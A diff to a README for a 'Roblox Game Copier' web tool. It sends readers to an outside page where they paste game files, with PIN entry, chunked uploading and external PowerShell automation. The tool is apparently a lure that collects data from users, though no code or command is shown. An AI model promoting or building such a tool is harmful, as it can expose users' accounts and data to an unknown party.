@@ -1,9 +1,9 @@
-# 🎮 Etique - Game Copier
+# 🎮 Etique - Roblox Game Copier
 # ⚠️ GO HERE TO COPY: https://hannesswee.github.io/roblox-game-copier/
 ## Etique Game Copier is a stylish, intuitive front-end interface for copying and submitting game files securely. Built with HTML, CSS, and JavaScript, it provides a sleek experience backed by PowerShell-based automation (external), intended for controlled environments or file testing.
 
 **🚀 Features**
-- 🔗 Simple Interface – Just paste your game file path or contents and press Start Copying!
+- 🔗 Simple Interface – Just paste your roblox game file and press Start Copying!
 - 🔒 PIN Protection – Add a personal PIN for added identification or security.
 - 📤 Segmented Uploading – Large file contents are automatically split and processed in chunks.
 - 🎥 Tutorial Included – Built-in video walkthrough helps first-time users get started fast.
